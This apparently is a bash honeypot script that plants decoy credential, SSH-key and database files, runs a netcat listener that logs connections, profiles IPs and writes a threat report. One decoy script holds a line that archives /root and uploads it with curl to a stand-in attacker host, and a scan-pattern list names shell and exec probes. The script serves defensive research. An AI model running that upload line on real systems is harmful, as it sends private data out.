#!/usr/bin/env bash
#===============================================================================
# System Eyes - Honeypot/Counter-Attack Analysis Tool
# EDUCATIONAL/RESEARCH PURPOSES ONLY
# 
# This tool creates a honeypot environment to:
# 1. Detect attacker reconnaissance
# 2. Log attacker behavior
# 3. Gather threat intelligence
# 4. Potentially mislead attackers
#
# ⚠️ LEGAL DISCLAIMER: Consult legal counsel before deploying counter-measures
#===============================================================================

set -euo pipefail

ROOT="/root/eyes_cerberus"
HONEYPOT_DIR="$ROOT/honeypot"
LOG_DIR="$HONEYPOT_DIR/logs"
DECOY_DIR="$HONEYPOT_DIR/decoys"
CONFIG_FILE="$HONEYPOT_DIR/honeypot_config.cfg"

mkdir -p "$LOG_DIR" "$DECOY_DIR"

log() {
    echo "$(date -Iseconds) [HONEYPOT] $*" | tee -a "$LOG_DIR/honeypot.log"
}

#===============================================================================
# FAKE VULNERABILITY INDICATORS
# Create decoy files that look like vulnerabilities to attackers
#===============================================================================

create_decoy_files() {
    log "Creating decoy files..."
    
    # Fake credentials file
    cat > "$DECOY_DIR/.fake_credentials" << 'EOF'
# System Credentials - CONFIDENTIAL
DB_HOST=localhost
DB_USER=admin
DB_PASS=FakePassword123!
API_KEY=sk-fake123456789
ADMIN_EMAIL=admin@example.com
EOF
    chmod 644 "$DECOY_DIR/.fake_credentials"
    
    # Fake backup script
    cat > "$DECOY_DIR/backup.sh" << 'EOF'
#!/bin/bash
# Backup script - runs daily
tar -czf /tmp/backup.tar.gz /root/*
# Upload to remote server
curl -X POST -F "file=@/tmp/backup.tar.gz" http://fake-attacker-server.com/upload
EOF
    chmod 755 "$DECOY_DIR/backup.sh"
    
    # Fake config with backdoor
    cat > "$DECOY_DIR/.backdoor_config" << 'EOF'
# Backdoor configuration
BACKDOOR_PORT=31337
BACKDOOR_PASS=secret123
LOG_FILE=/tmp/.hidden_log
EOF
    chmod 600 "$DECOY_DIR/.backdoor_config"
    
    # Fake SSH keys
    mkdir -p "$DECOY_DIR/.ssh"
    echo "FAKE_SSH_PRIVATE_KEY_CONTENT" > "$DECOY_DIR/.ssh/id_rsa"
    echo "FAKE_SSH_PUBLIC_KEY_CONTENT" > "$DECOY_DIR/.ssh/id_rsa.pub"
    chmod 600 "$DECOY_DIR/.ssh/id_rsa"
    chmod 644 "$DECOY_DIR/.ssh/id_rsa.pub"
    
    # Fake database dump
    cat > "$DECOY_DIR/db_dump.sql" << 'EOF'
-- MySQL dump
-- Database: production
CREATE TABLE users (id INT, username VARCHAR(50), password_hash VARCHAR(255));
INSERT INTO users VALUES (1, 'admin', 'fake_hash_12345');
INSERT INTO users VALUES (2, 'root', 'another_fake_hash');
EOF
    
    log "Decoy files created in $DECOY_DIR"
}

#===============================================================================
# FAKE SERVICE EMULATOR
# Emulate vulnerable services on honeypot port
#===============================================================================

start_fake_service() {
    local port=${1:-9009}
    log "Starting fake service on port $port..."
    
    # Create a named pipe for communication
    local pipe="/tmp/honeypot_pipe_$$"
    rm -f "$pipe"
    mkfifo "$pipe"
    
    # Start netcat listener that logs connections
    while true; do
        nc -l -p "$port" < "$pipe" | while read -r line; do
            echo "$(date -Iseconds) RECEIVED: $line" >> "$LOG_DIR/connections.log"
            
            # Send fake response
            case "$line" in
                *"getProducts"*|*"products"*)
                    echo '{"status":"fake","products":["fake_item_1","fake_item_2"]}'
                    ;;
                *"admin"*|*"password"*|*"credential"*)
                    echo '{"status":"success","data":"fake_credentials_sent"}'
                    ;;
                *"upload"*|*"file"*)
                    echo '{"status":"received","path":"/fake/path"}'
                    ;;
                *)
                    echo '{"status":"ok","message":"fake_service_response"}'
                    ;;
            esac
        done > "$pipe"
    done &
    
    echo $! > "$HONEYPOT_DIR/honeypot.pid"
    log "Fake service started (PID: $(cat $HONEYPOT_DIR/honeypot.pid))"
}

stop_fake_service() {
    if [ -f "$HONEYPOT_DIR/honeypot.pid" ]; then
        local pid
        pid=$(cat "$HONEYPOT_DIR/honeypot.pid")
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid"
            log "Fake service stopped (PID: $pid)"
        fi
        rm -f "$HONEYPOT_DIR/honeypot.pid"
    fi
}

#===============================================================================
# CONNECTION LOGGER
# Log all connection attempts to honeypot
#===============================================================================

log_connection() {
    local ip="$1"
    local port="$2"
    local timestamp
    timestamp=$(date -Iseconds)
    
    echo "$timestamp | IP: $ip | Port: $port" >> "$LOG_DIR/connections.log"
    
    # Also log to main hunt log
    echo "$timestamp [HONEYPOT] Connection from $ip:$port" >> "$ROOT/hunt.log"
    
    # GeoIP lookup (if available)
    if command -v geoiplookup &>/dev/null; then
        geoiplookup "$ip" >> "$LOG_DIR/geo_connections.log" 2>/dev/null || true
    fi
}

#===============================================================================
# ATTACKER PROFILING
# Gather information about connection attempts
#===============================================================================

profile_connection() {
    local ip="$1"
    local profile_file="$LOG_DIR/profile_${ip//./_}.txt"
    
    {
        echo "=== Attacker Profile ==="
        echo "IP: $ip"
        echo "First seen: $(date -Iseconds)"
        echo ""
        echo "--- Network Info ---"
        whois "$ip" 2>/dev/null | head -30 || echo "Whois unavailable"
        echo ""
        echo "--- Reverse DNS ---"
        host "$ip" 2>/dev/null || echo "Reverse DNS unavailable"
        echo ""
        echo "--- Connection History ---"
        grep "$ip" "$LOG_DIR/connections.log" 2>/dev/null || echo "No previous connections"
    } > "$profile_file"
    
    log "Profile created: $profile_file"
}

#===============================================================================
# FAKE VULNERABILITY SCANNER
# Detect if attacker is scanning for vulnerabilities
#===============================================================================

detect_scanning() {
    log "Monitoring for vulnerability scanning..."
    
    # Common vulnerability scan patterns
    local patterns=(
        "wp-admin"
        "phpmyadmin"
        ".env"
        "config.php"
        "admin.php"
        "backup"
        ".git"
        "shell"
        "cmd"
        "exec"
    )
    
    # Monitor access logs if web server running
    if [ -f /var/log/nginx/access.log ]; then
        for pattern in "${patterns[@]}"; do
            grep -i "$pattern" /var/log/nginx/access.log 2>/dev/null | tail -10
        done >> "$LOG_DIR/scan_attempts.log"
    fi
}

#===============================================================================
# COUNTER-INTELLIGENCE REPORT
# Generate report on attacker activity
#===============================================================================

generate_intel_report() {
    local report_file="$LOG_DIR/intel_report_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "=============================================="
        echo "  THREAT INTELLIGENCE REPORT"
        echo "  Generated: $(date)"
        echo "=============================================="
        echo ""
        echo "=== Unique Attacker IPs ==="
        cut -d'|' -f2 "$LOG_DIR/connections.log" 2>/dev/null | sort -u | wc -l
        echo ""
        echo "=== Top Attacker IPs ==="
        cut -d'|' -f2 "$LOG_DIR/connections.log" 2>/dev/null | sort | uniq -c | sort -rn | head -10
        echo ""
        echo "=== Connection Timeline ==="
        tail -50 "$LOG_DIR/connections.log"
        echo ""
        echo "=== Decoy Files Accessed ==="
        ls -la "$DECOY_DIR/" 2>/dev/null
        echo ""
        echo "=== Known Malicious IPs (from investigation) ==="
        echo "107.175.89.136"
        echo "87.121.84.56"
        echo ""
        echo "=== Recommendations ==="
        echo "1. Block top attacker IPs at firewall"
        echo "2. Report IPs to abuse contacts"
        echo "3. Share IOCs with security community"
        echo "4. Continue monitoring for new patterns"
    } > "$report_file"
    
    log "Intelligence report generated: $report_file"
    echo "Report: $report_file"
}

#===============================================================================
# MAIN EXECUTION
#===============================================================================

usage() {
    echo "System Eyes Honeypot Tool"
    echo ""
    echo "Usage: $0 <command> [options]"
    echo ""
    echo "Commands:"
    echo "  start [port]    - Start honeypot service (default port: 9009)"
    echo "  stop            - Stop honeypot service"
    echo "  status          - Check honeypot status"
    echo "  decoys          - Create decoy files"
    echo "  report          - Generate intelligence report"
    echo "  monitor         - Continuous monitoring mode"
    echo "  profile <ip>    - Create profile for IP"
    echo ""
    echo "⚠️  LEGAL NOTICE: Use responsibly and within legal boundaries"
}

case "${1:-help}" in
    start)
        create_decoy_files
        start_fake_service "${2:-9009}"
        ;;
    stop)
        stop_fake_service
        ;;
    status)
        if [ -f "$HONEYPOT_DIR/honeypot.pid" ]; then
            pid=$(cat "$HONEYPOT_DIR/honeypot.pid")
            if kill -0 "$pid" 2>/dev/null; then
                echo "Honeypot RUNNING (PID: $pid)"
                echo "Logs: $LOG_DIR/"
                echo "Decoys: $DECOY_DIR/"
            else
                echo "Honeypot NOT RUNNING (stale PID file)"
            fi
        else
            echo "Honeypot NOT STARTED"
        fi
        ;;
    decoys)
        create_decoy_files
        ;;
    report)
        generate_intel_report
        ;;
    monitor)
        log "Starting continuous monitoring..."
        while true; do
            detect_scanning
            sleep 60
        done
        ;;
    profile)
        if [ -n "${2:-}" ]; then
            profile_connection "$2"
        else
            echo "Usage: $0 profile <ip_address>"
        fi
        ;;
    help|*)
        usage
        ;;
esac
